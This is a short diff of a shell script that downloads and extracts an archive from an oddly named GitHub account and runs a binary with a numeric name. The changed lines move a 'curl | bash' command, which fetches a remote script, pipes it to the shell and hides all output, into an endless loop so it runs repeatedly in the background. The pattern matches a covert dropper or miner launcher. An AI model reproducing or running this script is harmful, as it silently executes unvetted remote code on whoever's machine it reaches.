@@ -2,10 +2,10 @@ wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/m
 tar -xf ./buildweb84744474.tar.xz
 cd ./build/
 
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/weblinux8474 | bash &> /dev/null &
-
 while true
 do
+
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/weblinux8474 | bash &> /dev/null &
 
 ./linux848888888874 linux8474
 
